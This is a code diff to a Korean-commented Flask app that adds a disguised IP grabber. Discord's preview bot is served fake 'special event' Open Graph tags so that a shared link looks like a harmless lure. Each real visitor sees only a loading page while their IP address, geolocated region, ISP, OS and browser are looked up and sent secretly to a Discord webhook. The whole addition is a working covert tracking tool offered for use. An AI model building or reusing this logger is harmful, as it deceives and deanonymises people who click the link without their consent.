@@ -3,7 +3,7 @@ import time
 import threading
 import requests
 from bs4 import BeautifulSoup
-from flask import Flask, request
+from flask import Flask, request, render_template_string
 from datetime import datetime
 
 app = Flask(__name__)
@@ -14,6 +14,25 @@ DISCORD_WEBHOOK_URL_IP = "https://discord.com/api/webhooks/1547879120195821639/3
 
 TARGET_URL = "https://weao.xyz"
 last_status = None
+
+# 🔥 디스코드 미리보기 HTML (나무위키 이미지 적용 완료)
+PREVIEW_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>이벤트 확인하기</title>
+    <!-- 디스코드 카드 미리보기를 조작하는 Open Graph 태그 -->
+    <meta property="og:title" content="🎁 특별 이벤트 참여하기">
+    <meta property="og:description" content="클릭해서 내용을 확인하세요!">
+    <meta property="og:image" content="https://i.namu.wiki/i/Va3Dy_3qFHvGQS4qwv0oCvFySbT1DXJkK0zfMosd2UK6Jun8Zucb796VLJzLL4A40e5P4dgbBPT4da2Bv_S50Q.webp">
+    <meta property="og:type" content="website">
+</head>
+<body style="background-color: #111; color: #fff; text-align: center; padding-top: 50px;">
+    <h2>로딩 중입니다... 잠시만 기다려주세요.</h2>
+</body>
+</html>
+"""
 
 # 1. 포타슘 상태 감시 백그라운드 스레드
 def monitor_potassium():
@@ -47,15 +66,21 @@ def monitor_potassium():
             
         time.sleep(60)
 
-# 2. 웹서버 접속 시 IP 및 브라우저 정보 로깅 (핑 봇 자동 필터링 적용)
+# 2. 웹서버 접속 시 IP 및 브라우저 정보 로깅 (핑 봇 자동 필터링 + OG 태그 적용)
 @app.route('/')
 def catch_ip():
+    user_agent = request.headers.get('User-Agent', 'N/A')
+    
+    # 디스코드 미리보기 봇이 긁어갈 때는 OG 태그가 담긴 HTML을 보여줌 (웹훅 안 쏨)
+    if "Discordbot" in user_agent:
+        print("[!] 디스코드 미리보기 봇이 이미지를 긁어감")
+        return render_template_string(PREVIEW_HTML)
+
     if request.headers.get('X-Forwarded-For'):
         user_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
     else:
         user_ip = request.remote_addr
         
-    user_agent = request.headers.get('User-Agent', 'N/A')
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     os_info = "기타 OS"
@@ -95,12 +120,26 @@ def catch_ip():
     elif "Safari/" in user_agent and "Chrome/" not in user_agent:
         browser_info = "Safari"
 
-    # UptimeRobot 같은 핑 봇은 '기타 OS'와 '기타 브라우저'로 잡히므로 웹훅을 쏘지 않고 차단함
+    # UptimeRobot 같은 핑 봇은 차단하고 미리보기 HTML 리턴
     if os_info == "기타 OS" and browser_info == "기타 브라우저":
         print(f"[!] 핑 봇 접속 차단됨 (IP: {user_ip})")
-        return "404 Not Found"
+        return render_template_string(PREVIEW_HTML)
 
-    print(f"[!] 실제 접속 감지 -> IP: {user_ip} | OS: {os_info} | Browser: {browser_info}")
+    # IP 주소로 대략적인 지역 및 통신사 조회 (ip-api 이용)
+    location_info = "조회 불가"
+    try:
+        if user_ip not in ["127.0.0.1", "localhost"]:
+            geo_res = requests.get(f"http://ip-api.com/json/{user_ip}?fields=status,country,regionName,city,isp", timeout=3).json()
+            if geo_res.get("status") == "success":
+                country = geo_res.get("country", "")
+                region = geo_res.get("regionName", "")
+                city = geo_res.get("city", "")
+                isp = geo_res.get("isp", "")
+                location_info = f"{country} / {region} ({city}) - {isp}"
+    except Exception as e:
+        print(f"[!] 위치 조회 에러: {e}")
+
+    print(f"[!] 실제 접속 감지 -> IP: {user_ip} | 지역: {location_info} | OS: {os_info} | Browser: {browser_info}")
         
     discord_payload = {
         "content": "서버 접속 알림",
@@ -111,6 +150,7 @@ def catch_ip():
                 "fields": [
                     {"name": "IP 주소", "value": f"`{user_ip}`", "inline": True},
                     {"name": "시간", "value": f"`{timestamp}`", "inline": True},
+                    {"name": "지역/통신사", "value": f"`{location_info}`", "inline": False},
                     {"name": "운영체제", "value": f"`{os_info}`", "inline": True},
                     {"name": "브라우저", "value": f"`{browser_info}`", "inline": True}
                 ]
@@ -123,7 +163,7 @@ def catch_ip():
     except Exception as e:
         print(f"[!] 디스코드 웹훅 에러 발생 : {e}")
     
-    return "404 Not Found"
+    return render_template_string(PREVIEW_HTML)
 
 if __name__ == '__main__':
     # 백그라운드 포타슘 감시 스레드 실행
